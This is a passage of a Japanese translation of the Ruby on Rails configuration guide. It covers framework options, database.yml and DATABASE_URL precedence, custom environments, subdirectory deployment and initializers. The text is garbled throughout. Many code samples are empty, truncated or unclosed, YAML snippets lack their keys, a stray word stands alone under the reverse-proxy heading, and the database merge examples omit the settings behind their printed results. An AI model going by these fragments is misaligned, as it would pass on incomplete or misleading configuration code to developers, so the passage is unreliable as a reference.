* `config.i18n.default_locale`は、アプリケーションのi18nで使用するデフォルトのロケールを設定します。
デフォルトは`:en`です。
* `config.i18n.enforce_available_locales`がオンになっていると、`available_locales`リストで宣言されていないロケールはi18nに渡せなくなります。利用できないロケールがある場合は`i18n::InvalidLocale`例外が発生します。
デフォルトは`true`です。
このオプションは、ユーザー入力のロケールが不正である場合のセキュリティ対策であるため、特別な理由がない限り無効にしないでください。
* `config.i18n.load_path`は、ロケールファイルの探索パスを設定します。
デフォルトは`config/locales/*.{yml,rb}`です。
### Active Recordを設定する。
`config.active_record`には多くのオプションが含まれています。
* `config.active_record.logger`は、Log4rのインターフェイスまたはデフォルトのRuby Loggerクラスに従うロガーを引数として取ります。このロガーは以後作成されるすべての新しいデータベース接続に渡されます。
Active Recordのモデルクラスまたはモデルインスタンスに対して`logger`メソッドを呼び出すと、このロガーを取り出せます。
ログ出力を無効にするには`nil`を設定します。
* `config.active_record.primary_key_prefix_type`は、主キーカラムの命名法を変更するのに使用します。
Railsのデフォルトでは、主キーカラムの名前に`id`が使用されます (なお`id`にしたい場合は値を設定する必要はありません)。
`id`以外に以下の2つを指定できます。
** `:table_name`を指定すると、たとえばCustomerクラスの主キーは`customerid`になります
** `:table_name_with_underscore`を指定すると、たとえばCustomerクラスの主キーは`customer_id`になります
* `config.active_record.table_name_prefix`は、テーブル名の冒頭にグローバルに追加したい文字列を指定します。
たとえば`northwest_`を指定すると、Customerクラスは`northwest_customers`をテーブルとして探します。
デフォルトは空文字列です。
* `config.active_record.table_name_suffix`はテーブル名の後ろにグローバルに追加したい文字列を指定します。
たとえば`_northwest`を指定すると、Customerは`customers_northwest`をテーブルとして探します。
* `config.active_record.schema_migrations_table_name`は、スキーママイグレーションテーブルの名前として使用する文字列を指定します。
* `config.active_record.pluralize_table_names`は、Railsが探すデータベースのテーブル名を単数形にするか複数形にするかを指定します。
trueに設定すると、Customerクラスが使用するテーブル名は複数形の`customers`になります(デフォルト)。
falseに設定すると、Customerクラスが使用するテーブル名は単数形の`customer`になります。
* `config.active_record.default_timezone`は、データベースから日付・時刻を取り出した際のタイムゾーンを`Time.local` (`:local`を指定した場合)と`Time.utc` (`:utc`を指定した場合)のどちらにするかを指定します。
デフォルトは`:utc`です。
* `config.active_record.schema_format`は、データベーススキーマをファイルに書き出す際のフォーマットを指定します。
デフォルトは`:ruby`で、データベースには依存せず、マイグレーションに依存します。`:sql`を指定するとSQL文で書き出されますが、この場合潜在的にデータベースに依存する可能性があります。
* `config.active_record.timestamped_migrations`は、マイグレーションファイル名にシリアル番号とタイムスタンプのどちらを与えるかを指定します。
デフォルトはtrueで、タイムスタンプが使用されます。開発者が複数の場合は、タイムスタンプの使用をお勧めします。
* `config.active_record.lock_optimistically`は、Active Recordで楽観的ロック(optimistic locking)を使用するかどうかを指定します。デフォルトはtrue(使用する)です。
* `config.active_record.cache_timestamp_format`は、キャッシュキーに含まれるタイムスタンプ値の形式を指定します。
デフォルトは`:number`です。
* `config.active_record.record_timestamps`は、モデルで発生する`create`操作や`update`操作にタイムスタンプを付けるかどうかを指定する論理値です。
デフォルト値は`true`です。
* `config.active_record.partial_writes`は、部分書き込みを行なうかどうか(「dirty」とマークされた属性だけを更新するか)を指定する論理値です。
データベースで部分書き込みを使用する場合は、`config.active_record.lock_optimistically`で楽観的ロックも使用する必要があります。これは、同時更新が行われた場合に、読み出しの状態が古い情報に基づいて属性に書き込まれる可能性があるためです。
* `config.active_record.maintain_test_schema`は、テスト実行時にActive Recordがテスト用データベーススキーマを`db/schema.rb`(または`db/structure.sql`)に基いて最新の状態にするかどうかを指定します。
デフォルト値は`true`です。
* `config.active_record.dump_schema_after_migration`は、マイグレーション実行時にスキーマダンプ(`db/schema.rb`または`db/structure.sql`)を行なうかどうかを指定します。
このオプションは、Railsが生成する`config/environments/production.rb`ではfalseに設定されます。
このオプションが無指定の場合は、デフォルトのtrueが指定されます。
MySQLアダプターを使用すると、以下の設定オプションが1つ追加されます。
* `ActiveRecord::ConnectionAdapters::MysqlAdapter.emulate_booleans`は、Active RecordがMySQLデータベース内のすべての`tinyint(1)`カラムをデフォルトでbooleanにするかどうかを指定します。デフォルトはtrueです。
スキーマダンパーは以下のオプションを追加します。
* `ActiveRecord::SchemaDumper.ignore_tables`はテーブル名の配列を1つ引数に取ります。どのスキーマファイルにも _含めたくない_ テーブル名がある場合はこの配列にテーブル名を含めます。
この設定は、`config.active_record.schema_format == :ruby`で「ない」場合は無視されます。
### Action Controllerを設定する
`config.action_controller`には多数の設定が含まれています。
* `config.action_controller.asset_host`はアセットを置くためのホストを設定します。
これは、アセットをホストする場所としてアプリケーションサーバーの代りにCDN(コンテンツ配信ネットワーク)を使用したい場合に便利です。
* `config.action_controller.perform_caching`は、アプリケーションでキャッシュを行なうかどうかを指定します。
developmentモードではfalse、productionモードではtrueに設定します。
* `config.action_controller.default_static_extension`は、キャッシュされたページに与える拡張子を指定します。
デフォルトは`.html`です。
* `config.action_controller.default_charset`は、すべての画面出力で使用されるデフォルトの文字セットを指定します。
デフォルトは"utf-8"です。
* `config.action_controller.logger`は、Log4rのインターフェイスまたはデフォルトのRuby Loggerクラスに従うロガーを引数として取ります。このロガーは、Action Controllerからの情報をログ出力するために使用されます。
* `config.action_controller.request_forgery_protection_token`は、RequestForgery対策用のトークンパラメータ名を設定します。
Calling `protect_from_forgery`を呼び出すと、デフォルトで`:authenticity_token`が設定されます。
* `config.action_controller.allow_forgery_protection`は、CSRF保護をオンにするかどうかを指定します。
testモードではデフォルトで`false`に設定され、それ以外では`true`に設定されます。
* `config.action_controller.relative_url_root`は、[サブディレクトリへのデプロイ](configuring.html#サブディレクトリにデプロイする-相対urlルートの使用)を行うことをRailsに伝えるために使用できます。
デフォルトは`ENV['RAILS_RELATIVE_URL_ROOT']`です。
* `config.action_controller.permit_all_parameters`は、マスアサインメントされるすべてのパラメータをデフォルトで許可することを設定します。
デフォルト値は`false`です。
* `config.action_controller.action_on_unpermitted_parameters`は、明示的に許可されていないパラメータが見つかった場合にログ出力または例外発生を行なうかどうかを指定します。
このオプションは、`:log`または`:raise`を指定すると有効になります。
test環境とdevelopment環境でのデフォルトは`:log`であり、それ以外の環境では`false`が設定されます。
### Action Dispatchを設定する
* `config.action_dispatch.session_store`はセッションデータのストア名を設定します。
デフォルトのストア名は`:cookie_store`です。この他に`:active_record_store`、`:mem_cache_store`、またはカスタムクラスの名前を指定できます。
* `config.action_dispatch.default_headers`は、HTTPヘッダーで使用されるハッシュです。このヘッダーはデフォルトですべてのレスポンスに設定されます。
このオプションは、デフォルトでは以下のように設定されます。
    config.action_dispatch.default_headers = {
      'X-Frame-Options' => 'SAMEORIGIN',
      'X-XSS-Protection' => '1; mode=block',
      'X-Content-Type-Options' => 'nosniff'
    }
* `config.action_dispatch.tld_length`は、アプリケーションで使用するトップレベルドメイン(TLD) の長さを指定します。
デフォルトは`1`です。
* `config.action_dispatch.http_auth_salt`は、HTTP Authのsalt値(訳注: ハッシュの安全性を強化するために加えられるランダムな値)を設定します。
デフォルトは`'http authentication'`です。
* `config.action_dispatch.signed_cookie_salt`は、署名済みcookie用のsalt値を設定します。
デフォルトは`'signed cookie'`です。
* `config.action_dispatch.encrypted_cookie_salt`は、暗号化済みcookie用のsalt値を設定します。
デフォルトは`'encrypted cookie'`です。
* `config.action_dispatch.encrypted_signed_cookie_salt`は、署名暗号化済みcookie用のsalt値を設定します。
デフォルトは`'signed encrypted cookie'`です。
* `config.action_dispatch.perform_deep_munge`は、パラメータに対して`deep_munge`メソッドを実行すべきかどうかを指定します。
詳細については[セキュリティガイド](security.html#安全でないクエリ生成)を参照してください。
デフォルトはtrueです。
  ```ruby
  ```
* `ActionDispatch::Callbacks.before`には、リクエストより前に実行したいコードブロックを1つ引数として与えます。
* `ActionDispatch::Callbacks.to_prepare`には、リクエストより前かつ`ActionDispatch::Callbacks.before`より後に実行したいコードブロックを1つ引数として与えます。
このブロックは、`development`モードではすべてのリクエストで実行されますが、`production`モードや、`cache_classes`が`true`に設定されている環境では1度しか実行されません。
* `ActionDispatch::Callbacks.after`には、リクエストの後に実行したいコードブロックを1つ引数として与えます。
### Action Viewを設定する
`config.action_view`にもわすかながら設定があります。
* `config.action_view.field_error_proc`は、Active Recordで発生したエラーの表示に使用するHTMLジェネレータを指定します。
    Proc.new do |html_tag, instance|
      %Q(<div class="field_with_errors">#{html_tag}</div>).html_safe
* `config.action_view.default_form_builder`は、Railsでデフォルトで使用するフォームビルダーを指定します。
デフォルトは、`ActionView::Helpers::FormBuilder`です。
フォームビルダーを初期化処理の後に読み込みたい場合(こうすることでdevelopmentモードではフォームビルダーがリクエストのたびに再読込されます)、`String`として渡すこともできます。
* `config.action_view.logger`は、Log4rのインターフェイスまたはデフォルトのRuby Loggerクラスに従うロガーを引数としてとります。このロガーは、Action Viewからの情報をログ出力するために使用されます。
* `config.action_view.erb_trim_mode`は、ERBで使用するトリムモードを指定します。
デフォルトは`'-'`で、`<%= -%>`または`<%= =%>`の場合に末尾スペースを削除して改行します。
詳細については[Erubisドキュメント](http://www.kuwata-lab.com/erubis/users-guide.06.html#topics-trimspaces)を参照してください。
* `config.action_view.embed_authenticity_token_in_remote_forms`は、フォームで`:remote => true`を使用した場合の`authenticity_token`のデフォルトの動作を設定します。
デフォルトではfalseであり、この場合リモートフォームには`authenticity_token`フォームが含まれません。これはフォームでフラグメントキャッシュを使用している場合に便利です。
リモートフォームは`meta`タグから認証を受け取るので、JavaScriptの動作しないブラウザをサポートしなければならないのでなければトークンの埋め込みは不要です。
JavaScriptが動かないブラウザのサポートが必要な場合は、`:authenticity_token => true`をフォームオプションとして渡すか、この設定を`true`にします。
* `config.action_view.prefix_partial_path_with_controller_namespace`は、名前空間化されたコントローラから出力されたテンプレートにあるサブディレクトリから、パーシャル(部分テンプレート)を探索するかどうかを指定します。
    ```erb
* `config.action_view.raise_on_missing_translations`は、i18nで訳文が失われている場合にエラーを発生させるかどうかを指定します。
### Action Mailerを設定する
`config.action_mailer`には多数の設定オプションがあります。
* `config.action_mailer.logger`は、Log4rのインターフェイスまたはデフォルトのRuby Loggerクラスに従うロガーを引数として取ります。このロガーは、Action Mailerからの情報をログ出力するために使用されます。
* `config.action_mailer.smtp_settings`は、`:smtp`配信方法を詳細に設定するのに使用できます。
これはオプションのハッシュを引数に取り、以下のどのオプションでも含めることができます。
    * `:address` - リモートのメールサーバーを指定します。
デフォルトの"localhost"設定から変更します。
    * `:port` - 使用するメールサーバーのポートが25番でないのであれば(めったにないと思いますが)、ここで対応できます。
    * `:domain` - HELOドメインの指定が必要な場合に使用します。
    * `:user_name` - メールサーバーで認証が要求される場合は、ここでユーザー名を設定します。
    * `:password` - メールサーバーで認証が要求される場合は、ここでパスワードを設定します。
    * `:authentication` - メールサーバーで認証が要求される場合は、ここで認証の種類を指定します。
`:plain`、`:login`、`:cram_md5`のいずれかのシンボルを指定できます。
* `config.action_mailer.sendmail_settings`は、`:sendmail`配信方法を詳細に設定するのに使用できます。
    * `:location` - sendmail実行ファイルの場所。
デフォルトは`/usr/sbin/sendmail`です。
    * `:arguments` - コマンドラインに与える引数。
デフォルトは`-i -t`です。
* `config.action_mailer.raise_delivery_errors`は、メールの配信が完了しなかった場合にエラーを発生させるかどうかを指定します。
* `config.action_mailer.delivery_method`は、配信方法を指定します。デフォルトは`:smtp`です。
詳細については、[Action Mailerガイド](http://guides.rubyonrails.org/action_mailer_basics.html#action-mailer-configuration)を参照してください。
* `config.action_mailer.perform_deliveries`は、メールを実際に配信するかどうかを指定します。デフォルトはtrueです。
テスト時にメール送信を抑制するのに便利です。
* `config.action_mailer.default_options`は、Action Mailerのデフォルトを設定します。
これは、メイラーごとに`from`や`reply_to`などを設定します。
デフォルトは以下のとおりです。
    mime_version:  "1.0",
    charset:       "UTF-8",
    content_type: "text/plain",
    parts_order:  ["text/plain", "text/enriched", "text/html"]
    ハッシュを1つ指定してオプションを追加することもできます。
    config.action_mailer.default_options = {
      from: "noreply@example.com"
* `config.action_mailer.observers`は、メールを配信したときに通知を受けるオブザーバーを指定します。
    config.action_mailer.observers = ["MailObserver"]
* `config.action_mailer.interceptors`は、メールを送信する前に呼び出すインターセプタを登録します。
    config.action_mailer.interceptors = ["MailInterceptor"]
```ruby
### Active Supportを設定する
Active Supportにもいくつかの設定オプションがあります。
* `config.active_support.bareは、Rails起動時に`active_support/all`の読み込みを行なうかどうかを指定します。
デフォルトは`nil`であり、この場合`active_support/all`は読み込まれます。
* `config.active_support.escape_html_entities_in_json`は、JSONシリアライズに含まれるHTMLエンティティをエスケープするかどうかを指定します。
* `config.active_support.use_standard_json_time_format`は、ISO 8601フォーマットに従った日付のシリアライズを行なうかどうかを指定します。
デフォルトは`true`です。
* `config.active_support.time_precision`は、JSONエンコードされた時間値の精度を指定します。
デフォルトは`3`です。
* `ActiveSupport::Logger.silencer`を`false`に設定すると、ブロック内でのログ出力を抑制する機能がオフになります。
デフォルト値は`true`です。
* `ActiveSupport::Cache::Store.logger`は、キャッシュストア操作で使用するロガーを指定します。
* `ActiveSupport::Deprecation.behavior`は、`config.active_support.deprecation`に対するもう一つのセッターであり、Railsの非推奨警告メッセージの表示方法を設定します。
* `ActiveSupport::Deprecation.silence`はブロックを1つ引数に取り、すべての非推奨警告メッセージを抑制します。
* `ActiveSupport::Deprecation.silenced`は、非推奨警告メッセージを表示するかどうかを指定します。
### データベースを設定する
ほぼすべてのRailsアプリケーションは、何らかの形でデータベースにアクセスします。
データベースへの接続は、環境変数`ENV['DATABASE_URL']`を設定するか、`config/database.yml`というファイルを設定することで行えます。
`config/database.yml`ファイルを使用することで、データベース接続に必要なすべての情報を指定できます。
```yaml
development:
  adapter: postgresql
  database: blog_development
  pool: 5
この設定を使用すると、`postgresql`を使用して、`blog_development`という名前のデータベースに接続します。
同じ接続情報をURL化して、以下のように環境変数に保存することもできます。
> puts ENV['DATABASE_URL']
`config/database.yml`ファイルには、Railsがデフォルトで実行できる3つの異なる環境を記述するセクションが含まれています。
* `development`環境は、ローカルの開発環境でアプリケーションと手動でやりとりを行うために使用されます。
* `test`環境は、自動化されたテストを実行するために使用されます。
* `production`環境は、アプリケーションを世界中に公開する本番で使用されます。
必要であれば、`config/database.yml`の内部でURLを直接指定することもできます。
  url: postgresql://localhost/blog_development?
`config/database.yml`ファイルにはERBタグ`<%= %>`を含めることができます。
タグ内に記載されたものはすべてRubyのコードとして評価されます。
このタグを使用して、環境変数から接続情報を取り出したり、接続情報の生成に必要な計算を行なうこともできます。
TIP: データベースの接続設定を手動で更新する必要はありません。
アプリケーションのジェネレータのオプションを表示してみると、`--database`というオプションがあるのがわかります。
このオプションでは、リレーショナルデータベースで最もよく使用されるアダプタをリストから選択できます。
さらに、`cd .. && rails new blog --database=mysql`のようにするとジェネレータを繰り返し実行することもできます。
`config/database.yml`ファイルが上書きされることを確認すると、アプリケーションの設定はSQLite用からMySQL用に変更されます。
よく使用されるデータベース接続方法の詳細な例については、次で説明します。
### 接続設定
環境変数を経由してデータベース接続を設定する方法が2とおりあるので、この2つがどのように相互作用するかを理解しておくことが重要です。
`config/database.yml`ファイルの内容が空で、かつ環境変数`ENV['DATABASE_URL']`が設定されている場合、データベースへの接続には環境変数が使用されます。
$ cat config/database.yml
$ echo $DATABASE_URL
postgresql://localhost/my_database
`config/database.yml`ファイルがあり、環境変数`ENV['DATABASE_URL']`が設定されていない場合は、`config/database.yml`ファイルを使用してデータベース接続が行われます。
  database: my_database
  host: localhost
`config/database.yml`ファイルと環境変数`ENV['DATABASE_URL']`が両方存在する場合、両者の設定はマージして使用されます。
以下のいくつかの例を参照して理解を深めてください。
提供された接続情報が重複している場合、環境変数が優先されます。
  adapter: sqlite3
  database: NOT_my_database
{"development"=>{"adapter"=>"postgresql", "host"=>"localhost", "database"=>"my_database"}}
上の実行結果で使用されている接続情報は、`ENV['DATABASE_URL']`の内容と一致しています。
提供された複数の情報が重複しておらず、競合している場合も、常に環境変数の接続設定が優先されます。
{"development"=>{"adapter"=>"postgresql", "host"=>"localhost", "database"=>"my_database", "pool"=>5}}
poolは`ENV['DATABASE_URL']`で提供される情報に含まれていないので、マージされています。
adapterは重複しているので、`ENV['DATABASE_URL']`の接続情報が優先されています。
`ENV['DATABASE_URL']`の情報よりもdatabase.ymlの情報を優先する唯一の方法は、database.ymlで`"url"`サブキーを使用して明示的にURL接続を指定することです。
  url: sqlite3:NOT_my_database
{"development"=>{"adapter"=>"sqlite3", "database"=>"NOT_my_database"}}
今度は`ENV['DATABASE_URL']`の接続情報は無視されました。アダプタとデータベース名が異なります。
`config/database.yml`にはERBを記述できるので、database.yml内で明示的に`ENV['DATABASE_URL']`を使用するのが最善の方法です。
これは特にproduction環境で有用です。データベース接続のパスワードのような秘密情報をGitなどのソースコントロールに直接登録することは避けなければならないからです。
production:
  url: <%= ENV['DATABASE_URL'] %>
以上の説明で動作が明らかになりました。接続情報は絶対にdatabase.ymlに直接書かず、常に`ENV['DATABASE_URL']`に保存したものを利用してください。
#### SQLite3データベースを設定する
Railsには[SQLite3](http://www.sqlite.org)のサポートがビルトインされています。SQLiteは軽量かつ専用サーバーの不要なデータベースアプリケーションです。
SQLiteは開発用・テスト用であれば問題なく使用できますが、本番での使用には耐えられない可能性があります。
Railsで新規プロジェクトを作成するとデフォルトでSQLiteが指定されますが、これはいつでも後から変更できます。
以下はデフォルトの接続設定ファイル(`config/database.yml`)に含まれる、開発環境用の接続設定です。
  database: db/development.sqlite3
  timeout: 5000
NOTE: Railsでデータ保存用にSQLite3データベースが採用されているのは、設定なしですぐに使用できるからです。
RailsではSQLiteに代えてMySQLやPostgreSQLなどを使用することもできます。また、データベース接続用のプラグインが多数あります。
production環境で何らかのデータベースを使用する場合、そのためのアダプタはたいていの場合探せば見つかります。
#### MySQLデータベースを設定する
Rails同梱のSQLite3に代えてMySQLを採用した場合、`config/database.yml`の記述方法を少し変更します。
developmentセクションの記述は以下のようになります。
  adapter: mysql2
  encoding: utf8
  username: root
  password:
  socket: /tmp/mysql.sock
開発環境のコンピュータにMySQLがインストールされており、ユーザー名root、パスワードなしで接続できるのであれば、上の設定で接続できるようになるはずです。
接続できない場合は、`development`セクションのユーザー名またはパスワードを適切なものに変更してください。
#### PostgreSQLデータベースを設定する
PostgreSQLを採用した場合は、`config/database.yml`の記述は以下のようになります。
  encoding: unicode
PostgreSQLのPrepared Statementsはデフォルトでオンになります。
`prepared_statements`を`false`に設定することでPrepared Statementsをオフにできます。
  prepared_statements: false
Prepared Statementsをオンにすると、Active Recordはデフォルトでデータベース接続ごとに最大`1000`までのPrepared Statementsを作成します。
この数値を変更したい場合は`statement_limit`に別の数値を指定します。
  statement_limit: 200
Prepared Statementsの使用量の増大は、そのままデータベースで必要なメモリー量の増大につながります。
PostgreSQLデータベースのメモリー使用量が上限に達した場合は、`statement_limit`の値を小さくするかPrepared Statementsをオフにしてください。
#### JRubyプラットフォームでSQLite3データベースを設定する
JRuby環境でSQLite3を採用する場合、`config/database.yml`の記述方法は少し異なります。
developmentセクションは以下のようになります。
  adapter: jdbcsqlite3
#### JRubyプラットフォームでMySQLデータベースを使用する
JRuby環境でMySQLを採用する場合、`config/database.yml`の記述方法は少し異なります。
  adapter: jdbcmysql
#### JRubyプラットフォームでPostgreSQLデータベースを使用する
JRuby環境でPostgreSQLを採用する場合、`config/database.yml`の記述方法は少し異なります。
  adapter: jdbcpostgresql
  username: blog
`development`セクションのユーザー名とパスワードは適切なものに置き換えてください。
### Rails環境を作成する
Railsにデフォルトで備わっている環境は、"development"、"test"、"production"の3つです。
通常はこの3つの環境で事足りますが、場合によっては環境を追加したくなることもあると思います。
たとえば、production環境をミラーコピーしたサーバーがあるが、テスト目的でのみ使用したいという場合を想定してみましょう。
このようなサーバーは通常「ステージングサーバー(staging server)」と呼ばれます。
"staging"環境をサーバーに追加したいのであれば、`config/environments/staging.rb`というファイルを作成するだけで済みます。
その際にはなるべく`config/environments`にある既存のファイルを流用し、必要な部分のみを変更するようにしてください。
このようにして追加された環境は、デフォルトの3つの環境と同じように利用できます。`rails server -e staging`を実行すればステージング環境でサーバーを起動でき、`rails console staging`や`Rails.env.staging?`なども動作するようになります。
### サブディレクトリにデプロイする (相対URLルートの使用)
Railsアプリケーションの実行は、アプリケーションのルートディレクトリ(`/`など)で行なうことが前提となっています。
この節では、アプリケーションをディレクトリの下で実行する方法について説明します。
ここでは、アプリケーションを"/app1"ディレクトリにデプロイしたいとします。
これを行なうには、適切なルーティングを生成できるディレクトリをRailsに指示する必要があります。
config.relative_url_root = "/app1"
あるいは、`RAILS_RELATIVE_URL_ROOT`環境変数に設定することもできます。
これで、リンクが生成される時に"/app1"がディレクトリ名の前に追加されます。
#### Passengerを使用する
Passengerを使用すると、アプリケーションをサブディレクトリで実行するのが容易になります。
#### リバースプロキシを使用する
change
#### サブディレクトリにデプロイする場合の検討事項
本番環境でRailsをサブディレクトリにデプロイすると、Railsの多くの部分に影響が生じます。
* 開発環境
* テスト環境
* 静的アセットの提供
* アセットパイプライン
Rails環境の設定
--------------------------
一部の設定については、Railsの外部から環境変数を与えることで行なうこともできます。
* `ENV["RAILS_ENV"]`は、Railsが実行される環境 (production、development、testなど) を定義します。
* `ENV["RAILS_RELATIVE_URL_ROOT"]`は、[アプリケーションをサブディレクトリにデプロイする](configuring.html#サブディレクトリにデプロイする-相対urlルートの使用)ときにルーティングシステムがURLを認識するために使用されます。
* `ENV["RAILS_CACHE_ID"]`と`ENV["RAILS_APP_VERSION"]`は、Railsのキャッシュを扱うコードで拡張キャッシュを生成するために使用されます。
これにより、ひとつのアプリケーションの中で複数の独立したキャッシュを扱うことができるようになります。
イニシャライザファイルを使用する
Railsは、フレームワークの読み込みとすべてのgemの読み込みが終わってから、イニシャライザの読み込みを開始します。
イニシャライザとは、アプリケーションの`config/initializers`ディレクトリに保存されるRubyファイルのことです。
たとえば各部分のオプション設定をイニシャライザに保存しておき、フレームワークとgemがすべて読み込まれた後に適用することができます。
NOTE: イニシャライザを置くディレクトリにサブフォルダを作ってイニシャライザを整理することもできます。Railsはイニシャライザ用のディレクトリの下のすべての階層を探して実行してくれます。
TIP: イニシャライザの実行順序を指定したい場合は、イニシャライザのファイル名を使用して実行順序を制御できます。
各フォルダのイニシャライザはアルファベット順に読み込まれます。
たとえば`01_critical.rb`は最初に読み込まれ、`02_normal.rb`は次に読み込まれます。
初期化イベント
Railsにはフック可能な初期化イベントが5つあります。以下に紹介するこれらのイベントは、実際に実行される順序で掲載しています。
* `before_configuration`: これは`Rails::Application`からアプリケーション定数を継承した直後に実行されます。
`config`呼び出しは、このイベントより前に評価されますので注意してください。
* `before_initialize`: これは、`:bootstrap_hook`イニシャライザを含む初期化プロセスの直前に、直接実行されます。`:bootstrap_hook`は、Railsアプリケーション初期化プロセスのうち比較的最初の方にあります。
* `to_prepare`: これは、Railties用のイニシャライザとアプリケーション自身用のイニシャライザがすべて実行された後、かつ事前一括読み込み(eager loading)の実行とミドルウェアスタックの構築が行われる前に実行されます(訳注: RailtiesはRailsのコアライブラリの1つで、Rails Utilitiesのもじりです)。
さらに重要な点は、これは`development`モードではサーバーへのリクエストのたびに必ず実行されますが、`production`モードと`test`モードでは起動時に1度だけしか実行されないことです。
* `before_eager_load`: これは、事前一括読み込みが行われる前に直接実行されます。これは`production`環境ではデフォルトの動作ですが、`development`環境では異なります。
* `after_initialize`: これは、アプリケーションの初期化が終わり、かつ`config/initializers`以下のイニシャライザが実行された後に実行されます。
これらのフックのイベントを定義するには、`Rails::Application`、`Rails::Railtie`、または`Rails::Engine`サブクラス内でブロック記法を使用します。
module YourApp
  class Application < Rails::Application
    config.before_initialize do
      # initialization code goes here
あるいは、`Rails.application`オブジェクトに対して`config`メソッドを実行することで行なうこともできます。
Rails.application.config.before_initialize do
  # initialization code goes here
WARNING: アプリケーションの一部、特にルーティング周りでは、`after_initialize`ブロックが呼び出された時点では設定が完了していないものがあります。
### `Rails::Railtie#initializer`
Railsでは、`Rails::Railtie`に含まれる`initializer`メソッドを使用してすべて定義され、起動時に実行されるイニシャライザがいくつもあります。
以下はAction Controllerの`set_helpers_path`イニシャライザから取った例です。
initializer "action_controller.set_helpers_path" do |app|
  ActionController::Helpers.helpers_path = app.helpers_paths
この`initializer`メソッドは3つの引数を取ります。1番目はイニシャライザの名前、2番目はオプションハッシュ(上の例では使ってません)、そして3番目はブロックです。
オプションハッシュに含まれる`:before`キーを使用して、新しいイニシャライザより前に実行したいイニシャライザを指定することができます。同様に、`:after`キーを使用して、新しいイニシャライザより _後_ に実行したいイニシャライザを指定できます。
`initializer`メソッドを使用して定義されたイニシャライザは、定義された順序で実行されます。ただし`:before`や`:after`を使用した場合を除きます。
WARNING: イニシャライザが起動される順序は、論理的に矛盾が生じない限りにおいて、beforeやafterを使用していかなる順序に変更することもできます。
たとえば、"one"から"four"までの4つのイニシャライザがあり、かつこの順序で定義されたとします。ここで"four"を"four"より _前_ かつ"three"よりも _後_ になるように定義すると論理矛盾が発生し、イニシャライザの実行順を決定できなくなってしまいます。
`initializer`メソッドのブロック引数は、アプリケーション自身のインスタンスです。そのおかげで、上の例で示したように、`config`メソッドを使用してアプリケーションの設定にアクセスできます。
実は`Rails::Application`は`Rails::Railtie`を間接的に継承しています。そのおかげで、`config/application.rb`で`initializer`メソッドを使用してアプリケーション用のイニシャライザを定義できるのです。
### イニシャライザ
Railsにあるイニシャライザのリストを以下にまとめました。これらは定義された順序で並んでおり、特記事項のない限り実行されます。
* `load_environment_hook`: これはプレースホルダとして使用されます。具体的には、`:load_environment_config`を定義してこのイニシャライザより前に実行したい場合に使用します。
* `load_active_support`: Active Supportの基本部分を設定する`active_support/dependencies`が必要です。
デフォルトの`config.active_support.bare`が信用できない場合には`active_support/all`も必要です。
* `initialize_logger`: ここより前の位置で`Rails.logger`を定義するイニシャライザがない場合、アプリケーションのロガー(`ActiveSupport::Logger`オブジェクト)を初期化し、`Rails.logger`にアクセスできるようにします。
* `initialize_cache`: `Rails.cache`が未設定の場合、`config.cache_store`の値を参照してキャッシュを初期化し、その結果を`Rails.cache`として保存します。
そのオブジェクトが`middleware`メソッドに応答する場合、そのミドルウェアをミドルウェアスタックの`Rack::Runtime`の前に挿入します。
* `set_clear_dependencies_hook`: `active_record.set_dispatch_hooks`へのフックを提供します。このイニシャライザより前に実行されます。
このイニシャライザは、`cache_classes`が`false`の場合にのみ実行されます。そして、このイニシャライザは`ActionDispatch::Callbacks.after`を使用して、オブジェクト空間からのリクエスト中に参照された定数を削除します。これにより、これらの定数は以後のリクエストで再度読み込まれるようになります。
* `initialize_dependency_mechanism`: `config.cache_classes`がtrueの場合、`ActiveSupport::Dependencies.mechanism`で依存性を(`load`ではなく)`require`に設定します。
* `bootstrap_hook`: このフックはすべての設定済み`before_initialize`ブロックを実行します。
* `i18n.callbacks`: development環境の場合、`to_prepare`コールバックを設定します。このコールバックは、最後にリクエストが発生した後にロケールが変更されると`I18n.reload!`を呼び出します。
productionモードの場合、このコールバックは最初のリクエストでのみ実行されます。
* `active_support.deprecation_behavior`: 環境に対する非推奨レポート出力を設定します。development環境ではデフォルトで`:log`、production環境ではデフォルトで`:notify`、test環境ではデフォルトで`:stderr`が指定されます。
`config.active_support.deprecation`に値が設定されていない場合、このイニシャライザは、現在の環境に対応する`config/environments`ファイルに値を設定するよう促すメッセージを出力します。
値の配列を設定することもできます。
* `active_support.initialize_time_zone`: `config.time_zone`の設定に基いてアプリケーションのデフォルトタイムゾーンを設定します。デフォルト値は"UTC"です。
* `active_support.initialize_beginning_of_week`: `config.beginning_of_week`の設定に基づいてアプリケーションのデフォルトの週開始日を設定します。デフォルト値は`:monday`です。
* `action_dispatch.configure`: `ActionDispatch::Http::URL.tld_length`を構成して、`config.action_dispatch.tld_length`の値(トップレベルドメイン名の長さ)が設定されるようにします。
* `action_view.set_configs`: `config.action_view`の設定を使用してAction Viewを設定します。使用される`config.action_view`の設定は、メソッド名が`ActionView::Base`に対するセッターとして`send`され、それを経由して値が渡されることによって行われます。
* `action_controller.logger`: `Rails.logger`に対する設定が行われていない場合に`ActionController::Base.logger`を設定します。
* `action_controller.initialize_framework_caches`: `Rails.cache`に対する設定が行われていない場合に`ActionController::Base.cache_store`を設定します。
* `action_controller.set_configs`: `config.action_controller`の設定を使用してAction Controllerを設定します。使用される`config.action_controller`の設定は、メソッド名が`ActionController::Base`に対するセッターとして`send`され、それを経由して値が渡されることによって行われます。
* `action_controller.compile_config_methods`: 指定された設定用メソッドを初期化し、より高速にアクセスできるようにします。
* `active_record.initialize_timezone`: `ActiveRecord::Base.time_zone_aware_attributes`をtrueに設定し、`ActiveRecord::Base.default_timezone`をUTCに設定します。
* `active_record.logger`: `Rails.logger`に対する設定が行われていない場合に`ActiveRecord::Base.logger`を設定します。
* `active_record.set_configs`: `config.active_record`の設定を使用してActive Recordを設定します。使用される`config.active_record`の設定は、メソッド名が`ActiveRecord::Base`に対するセッターとして`send`され、それを経由して値が渡されることによって行われます。
* `active_record.initialize_database`: データベース設定を`config/database.yml`(デフォルトの読み込み元)から読み込み、現在の環境で接続を確立します。
* `active_record.log_runtime`: `ActiveRecord::Railties::ControllerRuntime`をインクルードします。これは、リクエストでActive Record呼び出しにかかった時間をロガーにレポートする役割を担います。
* `active_record.set_dispatch_hooks`: `config.cache_classes`が`false`に設定されている場合、再読み込み可能なデータベース接続をすべてリセットします。
* `action_mailer.logger`: `Rails.logger`に対する設定が行われていない場合に`ActionMailer::Base.logger`を設定します。
* `action_mailer.set_configs`: `config.action_mailer`の設定を使用してAction Mailerを設定します。使用される`config.action_mailer`の設定は、メソッド名が`ActiveRecord::Base`に対するセッターとして`send`され、それを経由して値が渡されることによって行われます。
